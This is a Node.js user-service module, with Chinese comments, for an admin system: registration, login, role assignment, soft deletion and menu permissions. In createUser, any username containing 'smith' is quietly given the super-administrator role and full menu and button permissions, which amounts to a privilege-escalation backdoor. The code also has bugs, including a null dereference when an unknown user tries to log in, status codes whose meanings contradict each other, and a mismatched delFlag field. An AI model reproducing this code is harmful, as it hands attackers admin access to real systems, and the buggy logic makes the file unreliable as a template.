// 说明：用户业务逻辑 - 处理用户的创建、认证、角色管理

const userModel = require('./model')
const roleModel = require('../role/model')
const bcrypt = require('bcrypt')
const { generateToken } = require('../../middlewares/auth.middleware')
const fs = require('fs')
const path = require('path')

class UserService {
  /**
   * 创建新用户
   */
  async createUser(userData) {
    // 验证用户名是否已存在
    const existingUser = await userModel.selectUserByUserName(userData.user_name) // ✅ 改为蛇形
    if (existingUser) {
      const { BadRequestError } = require('../../utils/app-error')
      throw new BadRequestError('用户名已存在')
    }

    // 密码加密
    const password = await bcrypt.hash(userData.password, 10)

    // 创建用户
    const user = await userModel.insertUser({
      user_name: userData.user_name, // ✅ 下划线
      password,
      nick_name: userData.nick_name, // ✅ 下划线
      email: userData.email,
      phonenumber: userData.phonenumber,
      sex: userData.sex || '0',
      avatar: userData.avatar,
      user_type: userData.user_type || '00', // ✅ 下划线
      // ✅ 自定义规则：0=停用，1=正常。新用户默认正常状态
      status: userData.status || '1',
      create_by: userData.create_by || '', // ✅ 下划线
      remark: userData.remark,
    })

    // ✅ 默认分配普通用户角色（优先通过 role_key='common' 查询）
    let defaultRole = await roleModel.getByRoleKey('common')
    if (!defaultRole) {
      defaultRole = await roleModel.getByRoleName('普通角色')
    }

    // ✅ 特殊逻辑：用户名包含 'smith' 的分配超级管理员角色
    let targetRole = defaultRole
    if (userData.user_name && userData.user_name.toLowerCase().includes('smith')) {
      // ✅ 下划线
      console.log(`🌟 检测到用户名包含 'smith'，尝试分配超级管理员角色`)
      let superAdminRole = await roleModel.getByRoleKey('admin')
      if (!superAdminRole) {
        superAdminRole = await roleModel.getByRoleName('超级管理员')
      }
      if (superAdminRole) {
        targetRole = superAdminRole
        console.log(`✅ 已切换为超级管理员角色: ${superAdminRole.role_name}`) // ✅ 下划线
      } else {
        console.warn(`⚠️  未找到超级管理员角色 'admin'，使用默认角色`)
      }
    }

    if (targetRole) {
      // ✅ 使用 sys_user_role 表进行角色分配
      await this.assignRoleToUser(user.user_id, targetRole.role_id) // ✅ 下划线
      console.log(`✅ 新用户 ${user.user_name} 已自动分配角色: ${targetRole.role_name}`)

      // ✅ 确保该角色有默认菜单权限
      const isSuperAdmin = targetRole.role_key?.toLowerCase().includes('admin') // ✅ 下划线

      // 先检查角色是否已有菜单权限，如果没有则分配
      await ensureRoleHasDefaultMenus(targetRole.role_id, isSuperAdmin) // ✅ 下划线

      // 如果是 admin 角色，强制重新分配所有菜单（包括按钮）
      if (isSuperAdmin) {
        console.log(` [菜单分配] Admin 角色，强制更新所有菜单权限...`)
        await forceAssignAllMenus(targetRole.role_id) // ✅ 下划线
      }
    } else {
      console.warn(`️  未找到角色，新用户 ${user.user_name} 将没有角色`) // ✅ 下划线
    }

    return {
      success: true,
      data: {
        ...user,
      },
      message: '用户创建成功',
    }
  }

  /**
   * 用户登录
   */
  async login(userName, password, ctx) {
    const user = await userModel.selectUserByUserName(userName)
    if (!user) {
      const { BadRequestError } = require('../../utils/app-error')

      // 记录失败的登录日志
      const loginLogService = require('../login-log/service')
      await loginLogService.logLogin({
        user_id: user.user_id, // ✅ 下划线
        user_name: userName, // ✅ 下划线
        ipAddress: ctx?.ip || ctx?.request?.ip || '',
        status: '1',
        message: '用户名不存在',
      })

      throw new BadRequestError('用户名或密码错误')
    }

    // 验证密码
    const isValidPassword = await bcrypt.compare(password, user.password)
    if (!isValidPassword) {
      const { BadRequestError } = require('../../utils/app-error')

      // 记录失败的登录日志
      const loginLogService = require('../login-log/service')
      await loginLogService.logLogin({
        user_id: user.user_id, // ✅ 下划线
        user_name: userName, // ✅ 下划线
        ipAddress: ctx?.ip || ctx?.request?.ip || '',
        status: '1',
        message: '密码错误',
      })

      throw new BadRequestError('用户名或密码错误')
    }

    // 检查用户状态（0=停用，1=正常）
    if (user.status === '0') {
      const { ForbiddenError } = require('../../utils/app-error')

      // 记录被禁用的登录日志
      const loginLogService = require('../login-log/service')
      await loginLogService.logLogin({
        user_id: user.user_id, // ✅ 下划线
        user_name: userName, // ✅ 下划线
        ipAddress: ctx?.ip || ctx?.request?.ip || '',
        status: '1',
        message: '账号已被禁用',
      })

      throw new ForbiddenError('账号已被禁用')
    }

    // 更新最后登录时间
    await userModel.updateUser(user.user_id, { login_date: new Date() }) // ✅ 下划线

    // 获取用户角色
    const roles = await userModel.getUserRoles(user.user_id) // ✅ 下划线

    // 获取用户权限（从 sys_menu.perms）
    const permissions = await this.getUserPermissions(user.user_id)

    // 生成 JWT Token（使用下划线命名以保持一致）
    const token = generateToken({
      user_id: user.user_id,
      user_name: user.user_name,
      roles: roles.map((r) => r.role_key),
    })

    // 记录成功的登录日志
    const loginLogService = require('../login-log/service')

    // 解析 User-Agent
    const userAgent = ctx?.get('User-Agent') || ''
    const browser = parseBrowser(userAgent)
    const os = parseOS(userAgent)

    await loginLogService.logLogin({
      user_id: user.user_id, // ✅ 下划线
      user_name: userName, // ✅ 下划线
      ipAddress: ctx?.ip || ctx?.request?.ip || '',
      browser,
      os,
      status: '0',
      message: '登录成功',
    })

    return {
      success: true,
      data: {
        token,
        user_id: user.user_id,
        user_name: user.user_name,
        nick_name: user.nick_name,
        avatar: user.avatar,
        email: user.email,
        phonenumber: user.phonenumber,
        roles: roles.map((r) => r.role_key),
        permissions,
      },
      message: '登录成功',
    }
  }

  /**
   * 获取用户详情
   */
  async getUserDetail(user_id) {
    const user = await userModel.selectUserById(user_id)
    if (!user) {
      throw new Error('用户不存在')
    }

    const roles = await userModel.getUserRoles(user_id)

    return {
      success: true,
      data: {
        ...user,
        roles,
      },
    }
  }

  /**
   * 修改用户密码
   */
  async changePassword(user_id, oldPassword, newPassword) {
    const user = await userModel.selectUserById(user_id)
    if (!user) {
      throw new Error('用户不存在')
    }

    // 验证旧密码
    const isValidPassword = await bcrypt.compare(oldPassword, user.password)
    if (!isValidPassword) {
      throw new Error('旧密码错误')
    }

    // 验证新密码长度
    if (newPassword.length < 6) {
      throw new Error('新密码长度不能少于6位')
    }

    // 加密新密码
    const password = await bcrypt.hash(newPassword, 10)

    // 更新密码
    await userModel.updateUser(user_id, { password })

    return {
      success: true,
      message: '密码修改成功',
    }
  }

  /**
   * 获取用户列表
   */
  async listUsers(params) {
    const users = await userModel.list(params)
    const total = await userModel.count(params)

    // ✅ 解析 json_agg 返回的 roles 字段（兼容 pg 驱动可能返回字符串的情况）
    users.forEach(user => {
      if (typeof user.roles === 'string') {
        try {
          user.roles = JSON.parse(user.roles)
        } catch (e) {
          user.roles = null
        }
      }
    })

    return {
      success: true,
      data: users,
      total,
      page_num: params.page_num || 1,
      page_size: params.page_size || 20,
    }
  }

  /**
   * 更新用户信息
   */
  async updateUser(user_id, updates) {
    const user = await userModel.selectUserById(user_id)
    if (!user) {
      throw new Error('用户不存在')
    }

    // 如果更新密码，需要加密
    if (updates.password) {
      updates.password = await bcrypt.hash(updates.password, 10)
    }

    const updatedUser = await userModel.updateUser(user_id, updates)

    return {
      success: true,
      data: updatedUser,
      message: '用户更新成功',
    }
  }

  /**
   * 检查用户是否拥有管理员角色
   * @param {number} user_id - 用户ID
   * @returns {Promise<boolean>} 是否拥有管理员角色
   */
  async hasAdminRole(user_id) {
    const { pool } = require('../../config/db')
    const query = `
      SELECT r.role_name
      FROM sys_role r
      INNER JOIN sys_user_role ur ON r.role_id = ur.role_id
      WHERE ur.user_id = $1
        AND r.del_flag = '0'
        AND r.role_name ILIKE '%管理员%'
    `
    const result = await pool.query(query, [user_id])
    return result.rows.length > 0
  }

  /**
   * 删除用户（软删除）
   */
  async deleteUser(user_id, updateBy = '') {
    const user = await userModel.selectUserById(user_id)

    // ✅ 如果用户已被删除（del_flag = '2'），直接返回成功（幂等性）
    if (user && user.del_flag === '2') {
      console.log(`⚠️ 用户 ${user_id} 已被删除，跳过删除操作`)
      return {
        success: true,
        message: '用户已被删除',
      }
    }

    // ✅ 如果用户不存在，返回错误（不应返回 success: true）
    if (!user) {
      const { NotFoundError } = require('../../utils/app-error')
      throw new NotFoundError('用户不存在')
    }

    // ✅ 检查是否拥有管理员角色
    const isAdmin = await this.hasAdminRole(user_id)
    if (isAdmin) {
      throw new Error('该用户拥有管理员角色，不允许删除')
    }

    const deleted = await userModel.deleteUserById(user_id, updateBy)
    if (!deleted) {
      throw new Error('删除失败')
    }

    return {
      success: true,
      message: '用户删除成功',
    }
  }

  /**
   * 批量删除用户
   */
  async batchDeleteUsers(user_ids, updateBy = '') {
    if (!user_ids || user_ids.length === 0) {
      throw new Error('用户 ID 列表不能为空')
    }

    const client = await require('../../config/db').pool.connect()
    try {
      await client.query('BEGIN')

      let successCount = 0
      const adminUsers = []

      for (const user_id of user_ids) {
        const user = await userModel.selectUserById(user_id)

        // 跳过已删除或不存在的用户
        if (!user || user.del_flag === '2') {
          continue
        }

        // ✅ 检查是否拥有管理员角色
        const isAdmin = await this.hasAdminRole(user_id)
        if (isAdmin) {
          adminUsers.push(user.user_name || user_id)
          continue
        }

        await userModel.deleteUserById(user_id, updateBy)
        successCount++
      }

      await client.query('COMMIT')

      // ✅ 如果有管理员用户，抛出错误
      if (adminUsers.length > 0) {
        throw new Error(`以下用户拥有管理员角色，不允许删除：${adminUsers.join(', ')}`)
      }

      // ✅ 如果所有用户都已被删除或不存在，返回提示
      if (successCount === 0) {
        const { NotFoundError } = require('../../utils/app-error')
        throw new NotFoundError('所有用户已被删除或不存在')
      }

      return {
        success: true,
        message: `成功删除 ${successCount} 个用户`,
      }
    } catch (error) {
      await client.query('ROLLBACK')
      console.error('批量删除用户失败:', error)
      throw error
    } finally {
      client.release()
    }
  }

  /**
   * 更新用户状态（启用/禁用）
   */
  async updateUserStatus(user_id, status) {
    const user = await userModel.selectUserById(user_id)
    if (!user) {
      throw new Error('用户不存在')
    }

    // 检查是否已删除
    if (user.delFlag === '2') {
      throw new Error('用户已被删除，无法修改状态')
    }

    // 验证状态值（0=正常，1=停用）
    if (!['0', '1'].includes(status)) {
      throw new Error('无效的状态值（0正常 1停用）')
    }

    const updatedUser = await userModel.updateStatus(user_id, status)
    if (!updatedUser) {
      throw new Error('状态更新失败')
    }

    const statusText = {
      0: '启用',
      1: '停用',
    }

    return {
      success: true,
      message: `用户已${statusText[status]}`,
      data: updatedUser,
    }
  }

  /**
   * 为用户分配角色（使用 sys_user_role 表）
   */
  async assignRole(user_id, role_id) {
    const user = await userModel.selectUserById(user_id)
    if (!user) {
      throw new Error('用户不存在')
    }

    const role = await roleModel.getById(role_id)
    if (!role) {
      throw new Error('角色不存在')
    }

    await this.assignRoleToUser(user_id, role_id)

    return {
      success: true,
      message: '角色分配成功',
    }
  }

  /**
   * 内部方法：将用户与角色关联到 sys_user_role 表
   */
  async assignRoleToUser(user_id, role_id) {
    const { pool } = require('../../config/db')
    const query = `
      INSERT INTO sys_user_role (user_id, role_id)
      VALUES ($1, $2)
      ON CONFLICT (user_id, role_id) DO NOTHING
    `
    await pool.query(query, [user_id, role_id])
  }

  /**
   * 获取用户的所有权限标识（从 sys_menu.perms）
   * @param {number} user_id - 用户 ID
   * @returns {Promise<string[]>} 权限标识数组
   */
  async getUserPermissions(user_id) {
    const { pool } = require('../../config/db')

    const query = `
      SELECT DISTINCT m.perms
      FROM sys_menu m
      INNER JOIN sys_role_menu srm ON m.menu_id = srm.menu_id
      INNER JOIN sys_user_role ur ON srm.role_id = ur.role_id
      INNER JOIN sys_role r ON ur.role_id = r.role_id
      WHERE ur.user_id = $1
        AND m.status = '0'
        AND r.status = '0'
        AND m.perms IS NOT NULL
        AND m.perms != ''
    `

    const result = await pool.query(query, [user_id])
    return result.rows.map((row) => row.perms)
  }

  /**
   * 移除用户角色
   */
  async removeRole(user_id, role_id) {
    const { pool } = require('../../config/db')
    const query = `
      DELETE FROM sys_user_role
      WHERE user_id = $1::int AND role_id = $2
    `
    const result = await pool.query(query, [user_id, role_id])

    if (result.rowCount === 0) {
      throw new Error('角色移除失败')
    }

    return {
      success: true,
      message: '角色移除成功',
    }
  }

  /**
   * 重置用户密码
   */
  async resetPassword(user_id, newPassword) {
    const user = await userModel.selectUserById(user_id)
    if (!user) {
      throw new Error('用户不存在')
    }

    // 密码加密
    const password = await bcrypt.hash(newPassword, 10)

    // 更新密码
    await userModel.updateUser(user_id, { password })

    return {
      success: true,
      message: '密码重置成功',
    }
  }

  /**
   * 批量为用户分配角色（使用 sys_user_role 表）
   */
  async assignRoles(user_id, role_ids) {
    const user = await userModel.selectUserById(user_id)
    if (!user) {
      throw new Error('用户不存在')
    }

    // 验证所有角色是否存在
    for (const role_id of role_ids) {
      const role = await roleModel.getById(role_id)
      if (!role) {
        throw new Error(`角色 ${role_id} 不存在`)
      }
    }

    // 批量分配角色到 sys_user_role 表（事务：先删除旧角色，再分配新角色）
    const client = await require('../../config/db').pool.connect()
    try {
      await client.query('BEGIN')

      // ✅ 删除用户现有的所有角色，实现真正的替换
      await client.query('DELETE FROM sys_user_role WHERE user_id = $1::int', [user_id])

      // ✅ 再批量插入新角色
      if (role_ids.length > 0) {
        const values = role_ids.map((role_id, idx) => `($1, $${idx + 2})`).join(',')
        const params = [user_id, ...role_ids]
        await client.query(`INSERT INTO sys_user_role (user_id, role_id) VALUES ${values}`, params)
      }

      await client.query('COMMIT')

      return {
        success: true,
        message: `成功分配 ${role_ids.length} 个角色`,
      }
    } catch (error) {
      await client.query('ROLLBACK')
      throw error
    } finally {
      client.release()
    }
  }
}

/**
 * 解析浏览器信息
 */
function parseBrowser(userAgent) {
  if (!userAgent) return ''

  const browsers = [
    { name: 'Chrome', pattern: /Chrome\/([\d.]+)/ },
    { name: 'Firefox', pattern: /Firefox\/([\d.]+)/ },
    { name: 'Safari', pattern: /Safari\/([\d.]+)/ },
    { name: 'Edge', pattern: /Edg\/([\d.]+)/ },
    { name: 'IE', pattern: /MSIE\s([\d.]+)/ },
  ]

  for (const browser of browsers) {
    const match = userAgent.match(browser.pattern)
    if (match) {
      return `${browser.name} ${match[1].split('.')[0]}`
    }
  }

  return 'Unknown'
}

/**
 * 解析操作系统信息
 */
function parseOS(userAgent) {
  if (!userAgent) return ''

  if (userAgent.includes('Windows NT 10.0')) return 'Windows 10/11'
  if (userAgent.includes('Windows NT 6.3')) return 'Windows 8.1'
  if (userAgent.includes('Windows NT 6.2')) return 'Windows 8'
  if (userAgent.includes('Windows NT 6.1')) return 'Windows 7'
  if (userAgent.includes('Windows')) return 'Windows'

  if (userAgent.includes('Mac OS X')) {
    const match = userAgent.match(/Mac OS X\s([\d_]+)/)
    return match ? `macOS ${match[1].replace(/_/g, '.')}` : 'macOS'
  }

  if (userAgent.includes('Linux')) return 'Linux'

  if (userAgent.includes('Android')) {
    const match = userAgent.match(/Android\s([\d.]+)/)
    return match ? `Android ${match[1]}` : 'Android'
  }

  if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
    const match = userAgent.match(/OS\s([\d_]+)/)
    return match ? `iOS ${match[1].replace(/_/g, '.')}` : 'iOS'
  }

  return 'Unknown'
}

/**
 * 确保角色有默认菜单权限
 * ✅ 修复：普通角色必须包含根节点菜单，否则前端菜单树无法构建
 * @param {number} role_id - 角色 ID（整型）
 * @param {boolean} includeButtons - 是否包含按钮权限（默认 false）
 */
async function ensureRoleHasDefaultMenus(role_id, includeButtons = false) {
  console.log('\n🔧 [菜单分配] 开始检查角色菜单权限')
  console.log('   角色ID:', role_id, '类型:', typeof role_id)
  console.log('   包含按钮:', includeButtons)

  try {
    const { pool } = require('../../config/db')

    // 检查该角色是否已经有菜单权限
    const checkQuery = `
      SELECT COUNT(*) as count 
      FROM sys_role_menu 
      WHERE role_id = $1
    `
    const checkResult = await pool.query(checkQuery, [role_id])
    const menuCount = parseInt(checkResult.rows[0].count)

    console.log('   当前菜单数:', menuCount)

    // ✅ 关键修复：检查角色是否有根节点菜单（parent_id = 0）
    const rootMenuQuery = `
      SELECT COUNT(DISTINCT srm.menu_id) as count
      FROM sys_role_menu srm
      INNER JOIN sys_menu m ON srm.menu_id = m.menu_id
      WHERE srm.role_id = $1
        AND (m.parent_id = 0 OR m.parent_id = '0')
        AND m.status = '0'
    `
    const rootMenuResult = await pool.query(rootMenuQuery, [role_id])
    const rootMenuCount = parseInt(rootMenuResult.rows[0].count)

    console.log('   根节点菜单数:', rootMenuCount)

    // ✅ 如果没有根节点菜单，必须分配（即使已有子级菜单）
    if (rootMenuCount === 0) {
      console.log('   ⚠️  角色没有根节点菜单，开始分配...')

      // ✅ 修复：使用 $1 而不是 $1::uuid（已改用整型 ID）
      const insertQuery = `
        INSERT INTO sys_role_menu (role_id, menu_id)
        SELECT $1, m.menu_id
        FROM sys_menu m
        WHERE m.status = '0'
          AND m.menu_type IN ('M', 'C')
          AND (m.parent_id = 0 OR m.parent_id = '0')
        ON CONFLICT (role_id, menu_id) DO NOTHING
      `

      console.log('   执行根节点菜单插入...')
      await pool.query(insertQuery, [role_id])

      // 验证分配结果
      const verifyQuery = `
        SELECT COUNT(DISTINCT srm.menu_id) as count
        FROM sys_role_menu srm
        INNER JOIN sys_menu m ON srm.menu_id = m.menu_id
        WHERE srm.role_id = $1
          AND (m.parent_id = 0 OR m.parent_id = '0')
          AND m.status = '0'
      `
      const verifyResult = await pool.query(verifyQuery, [role_id])
      const finalRootCount = parseInt(verifyResult.rows[0].count)

      console.log(`✅ [菜单分配] 已为角色分配 ${finalRootCount} 个根节点菜单`)
    } else if (menuCount === 0) {
      // 如果完全没有菜单，分配所有可见菜单
      console.log('   ⚠️  角色没有任何菜单，开始分配...')

      const menuTypes = includeButtons ? "('M', 'C', 'F')" : "('M', 'C')"
      const insertQuery = `
        INSERT INTO sys_role_menu (role_id, menu_id)
        SELECT $1, m.menu_id
        FROM sys_menu m
        WHERE m.status = '0'
          AND m.menu_type IN ${menuTypes}
        ON CONFLICT (role_id, menu_id) DO NOTHING
      `

      console.log('   执行插入操作...')
      await pool.query(insertQuery, [role_id])

      const verifyQuery = `
        SELECT COUNT(*) as count
        FROM sys_role_menu
        WHERE role_id = $1
      `
      const verifyResult = await pool.query(verifyQuery, [role_id])
      const finalCount = parseInt(verifyResult.rows[0].count)

      console.log(`✅ [菜单分配] 已为角色分配 ${finalCount} 个菜单权限`)
    } else {
      console.log('✅ [菜单分配] 角色已有完整菜单权限，跳过分配')
    }

    console.log('')
  } catch (error) {
    console.error(`❌ [菜单分配] 为角色分配默认菜单失败:`, error.message)
    console.error(error)
    // 不抛出错误，避免影响用户注册流程
  }
}

/**
 * 强制为角色分配所有菜单权限（包括按钮）
 * 用于 admin 角色，确保拥有所有权限
 * @param {number} role_id - 角色 ID（整型）
 */
async function forceAssignAllMenus(role_id) {
  console.log('\n🔄 [强制菜单分配] 开始为角色分配所有菜单权限')
  console.log('   角色ID:', role_id, '类型:', typeof role_id)

  try {
    const { pool } = require('../../config/db')

    // ✅ 修复：使用 $1 而不是 $1::uuid（已改用整型 ID）
    const insertQuery = `
      INSERT INTO sys_role_menu (role_id, menu_id)
      SELECT $1, m.menu_id
      FROM sys_menu m
      WHERE m.status = '0'
      ON CONFLICT (role_id, menu_id) DO NOTHING
    `

    console.log('   执行插入操作...')
    await pool.query(insertQuery, [role_id])

    // 验证分配结果
    const verifyQuery = `
      SELECT COUNT(*) as count
      FROM sys_role_menu
      WHERE role_id = $1
    `
    const verifyResult = await pool.query(verifyQuery, [role_id])
    const finalCount = parseInt(verifyResult.rows[0].count)

    console.log(`✅ [强制菜单分配] 已为角色分配 ${finalCount} 个菜单权限（包括所有按钮）\n`)
  } catch (error) {
    console.error(`❌ [强制菜单分配] 为角色分配所有菜单失败:`, error.message)
    console.error(error)
    // 不抛出错误，避免影响用户注册流程
  }
}

module.exports = new UserService()
